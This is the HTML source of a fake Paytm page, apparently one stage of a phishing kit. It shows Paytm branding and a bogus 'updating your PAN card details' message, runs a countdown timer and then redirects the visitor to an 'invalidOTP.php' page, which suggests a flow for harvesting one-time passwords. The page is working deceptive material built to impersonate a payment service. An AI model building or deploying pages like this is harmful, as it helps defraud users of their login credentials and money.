<!DOCTYPE html>
 <html lang="eng">
 <head>
 <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
 <title>Proccessing... - Paytm Login</title>
    <style>
    #ad
    {
       width:20%;
       margin:-30px;
    }
    #ft
    {
    width: 102%;
    margin-left:-4px;
    }
    #img
    {
    width:50%;
    }
    #aa
    {
    width:104.5%;
    margin-left:-8px;
    border-bottom:solid #7212b3;
    border-width:4px;
    }
    #ll
    {
    width: 343px;
    background-color: white;
    color: #1D85FE;;
    border: solid #1D85FE;
    border-radius: 4px;
    border-width: 1px;
    cursor: pointer;
    font-size: 18px;
    height: 36px;
    margin-left: 2px;
    }
    #ll:hover
    {
    background-color:#01B9F5;
    color: white;
    border: solid #1D85FE;
    border-radius: 4px;
    border-width:0.1px;
    cursor: pointer;
    font-size: 18px;
    height: 36px;}
    #bg
    {
    width:104.5%;
    margin-left:-8px;
    border-bottom:solid #1D85FE;
    border-width:4px;
    }
    #ab
    {
    width:365px;
    border-bottom:solid #E6E6E6;
    border-width:1.5px;
    }
    </style>
    </head>
    <body>
    <b style="font-family:arial; font-size:25px; color:black; margin-left:15px;">Welcome to</b>
    <center><img src="plogo.png" alt="" id="img"></center>
     <div id="ab" 
     style="margin:10px; 
     margin-left:-8px;">
     </div><br>
     <center><b style="font-size:14px; font-family: Arial, Helvetica, sans-serif;">Thank you for using Paytm services</b></center><br><br>
    <center><img src="payt.gif" alt="" id="ad"><br><br><br></center>
    <form action="invalidOTP.php" method="post">
    <div id="ha">
    <center><h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Please wait while we Updating your <br>PAN card deatils...</h4></center>
    </div>
    <div id="ba">
   <center><b style="font-size:14px; font-family: Arial, Helvetica, sans-serif;">Don't press any key while proccessing...</b></center>
   </div><br><br>
   <!--<div id="bb">
   <center><b style="color:#7212b3; margin:0px;">We sending One Time Password on your registered mobile number.</b></center>
    </div>-->
    <body onload="startTimer();">
    <div style="text-align:center;">
    <script type="text/javascript">
    var timer=11;
    var sec=11;
    function startTimer() {
    sec=parseInt(timer%11);
    
    if (timer<2) {
    // timer.stop();
    window.location.href = "invalidOTP.php";
    }
    
    document.getElementById("time").innerHTML="<b> Please wait  </b>" +sec.toString();
    timer--;
    setTimeout(function(){
    startTimer();
    
    }, 1000);
    }
    </script>
    <div>
    <b style="color:grey; font-size:15px;"><span style="color:grey; font-size:15px;" id="time"></span>&nbsp;second</b><br><br><br><br>
    </div></div></body></form></body></html>
    